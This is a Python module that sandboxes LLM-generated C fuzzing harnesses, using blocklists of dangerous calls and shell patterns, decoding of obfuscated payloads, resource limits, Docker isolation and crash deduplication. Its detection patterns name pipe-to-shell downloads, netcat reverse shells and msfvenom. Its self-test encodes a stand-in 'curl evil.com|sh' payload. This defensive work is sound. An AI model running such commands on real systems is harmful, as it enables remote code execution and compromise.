#!/usr/bin/env python3
"""
Secure Harness Runner — Kerrigan-Fantasma
Defense-in-depth execution sandbox for LLM-generated C harnesses.

Layers:
  1. Harness validation  — blocks forbidden functions, assembly, obfuscated payloads
  2. Resource limits     — CPU, memory, disk, process count (via resource module)
  3. Docker isolation    — no network, no capabilities, read-only root (when available)
  4. Crash parsing       — normalized signature deduplication

Falls back gracefully: Docker → subprocess+limits → bare subprocess (with warning).
Integrates with existing EvolutionaryLoop, MutationFuzzer, CrashTriageEngine.
"""

import os
import re
import math
import time
import json
import hashlib
import logging
import resource
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import psutil

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


# ── Danger patterns ────────────────────────────────────────────────────────────

FORBIDDEN_FUNCTIONS = {
    "system", "popen", "exec", "execl", "execle", "execlp",
    "execv", "execvp", "execvpe", "execve", "fork", "clone",
    "vfork", "daemon", "socket", "connect", "bind", "listen",
    "accept", "sendto", "recvfrom", "shmat", "shmctl", "shmget",
    "mmap", "munmap", "mlock", "munlock", "ptrace", "personality",
    "unshare", "pivot_root", "mount", "umount", "reboot",
    "init_module", "delete_module",
}

FORBIDDEN_INCLUDES = {
    "sys/socket.h", "netinet/in.h", "arpa/inet.h",
    "pthread.h", "dlfcn.h",
}

FORBIDDEN_ASM = [
    r"int\s+\$0x80", r"\bsyscall\b", r"\bsysenter\b",
    r"\bcpuid\b", r"\brdmsr\b", r"\bwrmsr\b",
    r"\bcli\b", r"\bsti\b", r"\bhlt\b",
]

DANGEROUS_STRINGS = [
    r"curl\s+\S+\s*\|\s*(ba)?sh",
    r"wget\s+\S+\s*\|\s*(ba)?sh",
    r"bash\s+-c\b", r"sh\s+-c\b",
    r"nc\s+-e\s+/bin/(ba)?sh",
    r"msfvenom", r"meterpreter",
]

INLINE_ASM_MARKERS = ["__asm__", "asm(", "__asm(", "__volatile__", "asm volatile"]


def _recursive_decode(text: str, depth: int = 0, max_depth: int = 4) -> str:
    """Decode base64 / hex / URL-encoded payloads recursively."""
    if depth >= max_depth:
        return text

    import base64
    from urllib.parse import unquote

    # base64
    for b64decode in (base64.b64decode, base64.urlsafe_b64decode):
        try:
            decoded = b64decode(text).decode("utf-8", errors="ignore")
            if decoded != text and len(decoded) > 5:
                logger.warning(f"base64 decoded at depth {depth}: {decoded[:80]}")
                return _recursive_decode(decoded, depth + 1, max_depth)
        except Exception:
            pass

    # hex string
    hex_clean = text.replace(" ", "").replace("\n", "")
    if re.fullmatch(r"[0-9a-fA-F]+", hex_clean) and len(hex_clean) >= 8:
        try:
            decoded = bytes.fromhex(hex_clean).decode("utf-8", errors="ignore")
            if decoded != text:
                logger.warning(f"hex decoded at depth {depth}")
                return _recursive_decode(decoded, depth + 1, max_depth)
        except Exception:
            pass

    # URL
    if "%" in text:
        decoded = unquote(text)
        if decoded != text:
            logger.warning(f"URL decoded at depth {depth}")
            return _recursive_decode(decoded, depth + 1, max_depth)

    return text


def _shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    entropy = 0.0
    n = len(data)
    for count in freq.values():
        p = count / n
        entropy -= p * math.log2(p)
    return entropy / 8.0  # normalised to [0, 1]


def scan_for_danger(text: str, context: str = "code") -> tuple[bool, str]:
    """
    Multi-layer danger scan.
    Returns (safe, reason). safe=True means no danger found.
    """
    # Layer 1: forbidden function calls
    for fn in FORBIDDEN_FUNCTIONS:
        if re.search(rf"\b{fn}\s*\(", text, re.IGNORECASE):
            return False, f"Forbidden call: {fn}() in {context}"

    # Layer 2: forbidden includes
    for inc in FORBIDDEN_INCLUDES:
        if inc in text:
            return False, f"Forbidden include: {inc} in {context}"

    # Layer 3: inline assembly
    for marker in INLINE_ASM_MARKERS:
        if marker in text:
            return False, f"Inline assembly not allowed: {marker}"

    # Layer 4: assembly instructions
    for pattern in FORBIDDEN_ASM:
        if re.search(pattern, text, re.IGNORECASE):
            return False, f"Forbidden asm instruction in {context}"

    # Layer 5: dangerous shell patterns
    for pattern in DANGEROUS_STRINGS:
        if re.search(pattern, text, re.IGNORECASE):
            return False, f"Dangerous shell pattern in {context}"

    # Layer 6: decode obfuscation and re-scan
    decoded = _recursive_decode(text)
    if decoded != text:
        return scan_for_danger(decoded, f"{context}[decoded]")

    # Layer 7: high-entropy shellcode heuristic
    raw = text.encode("utf-8", errors="ignore")
    null_ratio = raw.count(0) / max(len(raw), 1)
    if _shannon_entropy(raw) > 0.82 and null_ratio < 0.02 and len(raw) > 32:
        return False, f"High-entropy shellcode pattern in {context}"

    return True, "clean"


# ── Resource limits ────────────────────────────────────────────────────────────

@dataclass
class ResourceConfig:
    cpu_seconds:      int   = 30
    memory_mb:        int   = 512
    disk_mb:          int   = 100
    timeout_seconds:  int   = 60
    max_output_bytes: int   = 1_048_576   # 1 MB


class ResourceManager:
    """Apply rlimits; restore originals on exit."""

    def __init__(self, cfg: ResourceConfig):
        self.cfg = cfg
        self._saved: dict[int, tuple] = {}

    def _set(self, res, soft, hard=None):
        self._saved[res] = resource.getrlimit(res)
        resource.setrlimit(res, (soft, hard if hard is not None else soft))

    def apply(self):
        try:
            self._set(resource.RLIMIT_CPU,   self.cfg.cpu_seconds,   self.cfg.cpu_seconds + 5)
            self._set(resource.RLIMIT_AS,    self.cfg.memory_mb * 1024 * 1024)
            self._set(resource.RLIMIT_FSIZE, self.cfg.disk_mb    * 1024 * 1024)
            self._set(resource.RLIMIT_NPROC, 16, 16)
            self._set(resource.RLIMIT_CORE,  0, 0)
        except Exception as e:
            logger.warning(f"Could not apply all rlimits: {e}")

    def restore(self):
        for res, old in self._saved.items():
            try:
                resource.setrlimit(res, old)
            except Exception:
                pass

    def __enter__(self):
        self.apply()
        return self

    def __exit__(self, *_):
        self.restore()


# ── Crash parsing (standalone — not tied to Docker) ────────────────────────────

_CRASH_SIGNATURES = [
    (r"heap-buffer-overflow",  "heap_overflow"),
    (r"stack-buffer-overflow", "stack_overflow"),
    (r"heap-use-after-free",   "use_after_free"),
    (r"double-free",           "double_free"),
    (r"undefined behaviour|runtime error", "ubsan"),
    (r"SIGSEGV|Segmentation fault", "segfault"),
    (r"SIGABRT|Aborted",       "abort"),
    (r"SIGILL|illegal instruction", "sigill"),
]


def parse_crash(output: str, exit_code: int) -> tuple[bool, Optional[str], Optional[str]]:
    """
    Returns (crashed, crash_type, dedup_signature).
    Works for ASan/UBSan output and bare signal exits.
    """
    text = output.lower()
    crash_type = None

    for pattern, ctype in _CRASH_SIGNATURES:
        if re.search(pattern, text, re.IGNORECASE):
            crash_type = ctype
            break

    if crash_type is None:
        if exit_code not in (0, None):
            crash_type = "unknown"
        else:
            return False, None, None

    # Normalize stack frames for dedup
    frames = []
    for line in output.splitlines():
        if re.search(r"#\d+\s+0x", line):
            clean = re.sub(r"0x[0-9a-fA-F]+", "ADDR", line)
            clean = re.sub(r":\d+", ":LINE", clean)
            frames.append(clean.strip())
        if len(frames) >= 4:
            break

    sig_raw = f"{crash_type}|{'|'.join(frames)}" if frames else f"{crash_type}|{exit_code}"
    sig = hashlib.sha256(sig_raw.encode()).hexdigest()[:16]
    return True, crash_type, sig


# ── Execution result ───────────────────────────────────────────────────────────

@dataclass
class ExecutionResult:
    success:          bool
    exit_code:        int
    stdout:           str
    stderr:           str
    crashed:          bool
    crash_type:       Optional[str]
    crash_signature:  Optional[str]
    execution_time:   float
    timed_out:        bool = False
    sandbox_mode:     str  = "subprocess"

    @property
    def output(self) -> str:
        return (self.stderr + self.stdout)[:4000]


def _make_error(msg: str, elapsed: float = 0.0) -> ExecutionResult:
    return ExecutionResult(False, -1, "", msg, False, None, None, elapsed)


# ── Docker sandbox ─────────────────────────────────────────────────────────────

_SANDBOX_IMAGE = "kerrigan-sandbox:latest"

_DOCKERFILE = """\
FROM alpine:3.19
RUN apk add --no-cache musl libgcc libstdc++ && \
    adduser -D -u 1000 runner && \
    mkdir -p /tmp/harness && chmod 1777 /tmp/harness
USER runner
WORKDIR /home/runner
"""


def _build_sandbox_image() -> bool:
    """Build the minimal sandbox Docker image. Returns True if successful."""
    with tempfile.TemporaryDirectory() as d:
        df = Path(d) / "Dockerfile"
        df.write_text(_DOCKERFILE)
        result = subprocess.run(
            ["docker", "build", "-t", _SANDBOX_IMAGE, d],
            capture_output=True,
        )
        return result.returncode == 0


def _docker_available() -> bool:
    try:
        return subprocess.run(["docker", "version"], capture_output=True).returncode == 0
    except FileNotFoundError:
        return False


def _run_in_docker(binary_path: Path, input_data: bytes, cfg: ResourceConfig) -> ExecutionResult:
    """Run binary in a locked-down Docker container."""
    t0 = time.time()

    # Ensure image exists
    check = subprocess.run(["docker", "images", "-q", _SANDBOX_IMAGE], capture_output=True, text=True)
    if not check.stdout.strip():
        if not _build_sandbox_image():
            return _make_error("Docker image build failed", time.time() - t0)

    mem_limit = min(cfg.memory_mb, int(psutil.virtual_memory().total / 1_048_576 * 0.15))

    cmd = [
        "docker", "run", "--rm",
        "--network",     "none",
        "--cap-drop",    "ALL",
        "--security-opt","no-new-privileges:true",
        "--read-only",
        "--tmpfs",       "/tmp:rw,noexec,nosuid,size=64m",
        "--memory",      f"{mem_limit}m",
        "--cpus",        "0.5",
        "--pids-limit",  "16",
        "--user",        "1000:1000",
        "-v",            f"{binary_path}:/binary:ro",
        _SANDBOX_IMAGE,
        "/binary",
    ]

    try:
        result = subprocess.run(
            cmd,
            input=input_data,
            capture_output=True,
            timeout=cfg.timeout_seconds,
        )
        elapsed = time.time() - t0
        stdout  = result.stdout.decode("utf-8", errors="replace")[:cfg.max_output_bytes]
        stderr  = result.stderr.decode("utf-8", errors="replace")[:cfg.max_output_bytes]
        crashed, ctype, sig = parse_crash(stderr + stdout, result.returncode)
        return ExecutionResult(
            success=result.returncode == 0,
            exit_code=result.returncode,
            stdout=stdout, stderr=stderr,
            crashed=crashed, crash_type=ctype, crash_signature=sig,
            execution_time=elapsed, sandbox_mode="docker",
        )
    except subprocess.TimeoutExpired:
        return ExecutionResult(False, -1, "", "timeout", False, None, None,
                               cfg.timeout_seconds, timed_out=True, sandbox_mode="docker")
    except Exception as e:
        return _make_error(f"Docker error: {e}", time.time() - t0)


# ── Subprocess fallback ────────────────────────────────────────────────────────

def _run_subprocess(binary_path: Path, input_data: bytes, cfg: ResourceConfig) -> ExecutionResult:
    """Run with resource limits — less isolated than Docker but works without it."""
    t0 = time.time()
    try:
        with ResourceManager(cfg):
            result = subprocess.run(
                [str(binary_path)],
                input=input_data,
                capture_output=True,
                timeout=cfg.timeout_seconds,
            )
        elapsed = time.time() - t0
        stdout  = result.stdout.decode("utf-8", errors="replace")[:cfg.max_output_bytes]
        stderr  = result.stderr.decode("utf-8", errors="replace")[:cfg.max_output_bytes]
        crashed, ctype, sig = parse_crash(stderr + stdout, result.returncode)
        return ExecutionResult(
            success=result.returncode == 0,
            exit_code=result.returncode,
            stdout=stdout, stderr=stderr,
            crashed=crashed, crash_type=ctype, crash_signature=sig,
            execution_time=elapsed, sandbox_mode="subprocess+rlimit",
        )
    except subprocess.TimeoutExpired:
        return ExecutionResult(False, -1, "", "timeout", False, None, None,
                               cfg.timeout_seconds, timed_out=True,
                               sandbox_mode="subprocess+rlimit")
    except Exception as e:
        return _make_error(f"Run error: {e}", time.time() - t0)


# ── Main interface ─────────────────────────────────────────────────────────────

class SecureHarnessRunner:
    """
    Drop-in secure replacement for the raw subprocess calls in MutationFuzzer.
    Validates harness code, enforces resource limits, isolates in Docker if available.
    """

    def __init__(self, cfg: ResourceConfig = None, use_docker: bool = True):
        self.cfg        = cfg or ResourceConfig()
        self._use_docker = use_docker and _docker_available()
        mode = "Docker" if self._use_docker else "subprocess+rlimit"
        logger.info(f"[SecureRunner] Sandbox mode: {mode}")

    def validate_code(self, code: str) -> tuple[bool, str]:
        """Validate C source before compilation."""
        safe, reason = scan_for_danger(code, "harness_source")
        if not safe:
            return False, reason
        if not re.search(r"int\s+main\s*\(", code):
            return False, "No standard main() found"
        return True, "ok"

    def run(self, binary_path: Path, input_data: bytes = b"") -> ExecutionResult:
        """Run a compiled binary securely with the given input."""
        if not binary_path.exists():
            return _make_error(f"Binary not found: {binary_path}")
        if self._use_docker:
            return _run_in_docker(binary_path, input_data, self.cfg)
        return _run_subprocess(binary_path, input_data, self.cfg)

    def fuzz_secure(
        self,
        binary_path: Path,
        mutations: list[bytes],
        on_crash=None,
    ) -> list[ExecutionResult]:
        """
        Secure version of MutationFuzzer.fuzz() — runs each mutation through
        the sandbox. Pass on_crash(result) to handle crashes immediately.
        """
        crashes = []
        clean   = 0
        for inp in mutations:
            result = self.run(binary_path, inp)
            if result.crashed or result.timed_out:
                crashes.append(result)
                if on_crash:
                    on_crash(result)
            else:
                clean += 1
        logger.info(f"[SecureRunner] {len(mutations)} inputs → "
                    f"{len(crashes)} crashes, {clean} clean ({binary_path.name})")
        return crashes


# ── Integration: secure evolutionary loop ─────────────────────────────────────

class SecureEvolutionaryLoop:
    """
    Wraps EvolutionaryLoop and replaces its raw subprocess fuzzing with
    SecureHarnessRunner. All other logic (LLM, triage, Creep) stays the same.
    """

    def __init__(self, loop, cfg: ResourceConfig = None, use_docker: bool = True):
        from loop.evolution import EvolutionaryLoop
        assert isinstance(loop, EvolutionaryLoop), "Pass an EvolutionaryLoop instance"
        self.loop   = loop
        self.runner = SecureHarnessRunner(cfg=cfg, use_docker=use_docker)

        # Monkey-patch the fuzzer's run_one method so all fuzzing goes through us
        original_run_one = loop.fuzzer.run_one

        def secure_run_one(binary_path, input_data):
            res = self.runner.run(binary_path, input_data)
            # Return a FuzzResult-compatible object
            from loop.fuzzer import FuzzResult
            return FuzzResult(
                input_data=input_data,
                exit_code=res.exit_code,
                stdout=res.stdout,
                stderr=res.stderr,
                timed_out=res.timed_out,
            )

        loop.fuzzer.run_one = secure_run_one
        logger.info("[SecureEvolutionaryLoop] Fuzzer patched with secure runner")

    def run(self, target: str, iterations: int = 3):
        """Delegate to the underlying loop — fuzzing is now secured."""
        return self.loop.run(target, iterations=iterations)


# ── Self-test ──────────────────────────────────────────────────────────────────

def self_test():
    print("=" * 55)
    print("  Kerrigan-Fantasma Secure Runner Self-Test")
    print("=" * 55)
    passed = 0

    # 1. Block system()
    safe, reason = scan_for_danger('#include <stdlib.h>\nvoid t(){system("ls");}')
    assert not safe, "Should block system()"
    print(f"✓ Blocked system(): {reason}")
    passed += 1

    # 2. Block forbidden include
    safe, reason = scan_for_danger('#include <sys/socket.h>')
    assert not safe, "Should block socket include"
    print(f"✓ Blocked forbidden include: {reason}")
    passed += 1

    # 3. Decode base64 obfuscation
    import base64
    payload = base64.b64encode(b'system("curl evil.com|sh")').decode()
    decoded = _recursive_decode(payload)
    assert "system" in decoded
    print(f"✓ Decoded base64 obfuscation: {decoded[:40]}...")
    passed += 1

    # 4. Block inline assembly
    safe, reason = scan_for_danger("void t(){ __asm__(\"syscall\"); }")
    assert not safe
    print(f"✓ Blocked inline asm: {reason}")
    passed += 1

    # 5. Clean code passes
    clean = '#include <stdio.h>\nint main(){printf("ok\\n");return 0;}'
    safe, reason = scan_for_danger(clean)
    assert safe, f"Clean code wrongly blocked: {reason}"
    print(f"✓ Clean code passes validation")
    passed += 1

    # 6. ResourceConfig instantiates
    cfg = ResourceConfig(cpu_seconds=5, memory_mb=128)
    assert cfg.timeout_seconds == 60
    print(f"✓ ResourceConfig OK")
    passed += 1

    # 7. Docker detection
    docker = _docker_available()
    print(f"{'✓' if docker else '⚠'} Docker: {'available' if docker else 'not found (subprocess mode)'}")
    passed += 1

    print(f"\n{passed}/7 checks passed")
    print("=" * 55)


if __name__ == "__main__":
    self_test()
